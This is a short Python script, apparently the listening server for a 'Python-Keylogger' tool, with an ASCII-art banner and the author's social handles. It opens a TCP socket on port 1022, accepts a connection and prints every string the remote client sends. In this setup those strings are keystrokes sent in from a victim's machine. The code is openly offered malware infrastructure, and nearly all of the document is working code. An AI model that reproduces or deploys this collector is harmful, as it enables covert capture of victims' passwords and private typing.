import socket
import os
from datetime import datetime

# Function For Print Banner
def banner():
    print('''
             _,.
           ,''   `.     __....__ 
         ,'        >.-''        ``-.__,)
       ,'      _,''           _____ _,'
      /      ,'           _.:':::_`:-._ 
     :     ,'       _..-''  \`'.;.`-:::`:. 
     ;    /       ,'  ,::'  .\,'`.`. `\::)`  
    /    /      ,'        \   `. '  )  )/ 
   /    /      /:`.     `--`'   \     '`
   `-._/      /::::)             )
      /      /,-.:(   , _   `.-' 
     ;      :(,`.`-' ',`.     ;
    :       |:\`' )      `-.._\ _
    |         `:-(             `)``-._ 
    |           `.`.        /``'      ``:-.-__,
    :           / `:\ .     :            ` \`-
     \        ,'   '}  `.   |
  _..-`.    ,'`-.   }   |`-'    
,'__    `-'' -.`.'._|   | 
    ```--..,.__.(_|.|   |::._
      __..','/ ,' :  `-.|::)_`.
      `..__..-'   |`.      __,' 
                  :  `-._ `  ;
                   \ \   )  / Instagram: cyberfo
                   .\ `.   /  Github   : https://github.com/wodsec3
                    ::    /   Welcome Friends To Python-Keylogger
                    :|  ,'
                    :;,' 
                    `'
    ''')

# This Function Just For Clear Console
def clear():
    try:
        os.system('cls')
    except:
        os.system('clear')

clear()
banner()

time=datetime.now()
host='0.0.0.0'
port=1022
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))
sock.listen(10)
print('Listening At %s'%(time))

try:
    client, addr=sock.accept()
except Exception as e:
    print(str(e))

while True:
    output=client.recv(1024).decode('utf-8')
    print(f'[{addr}]: '+output)
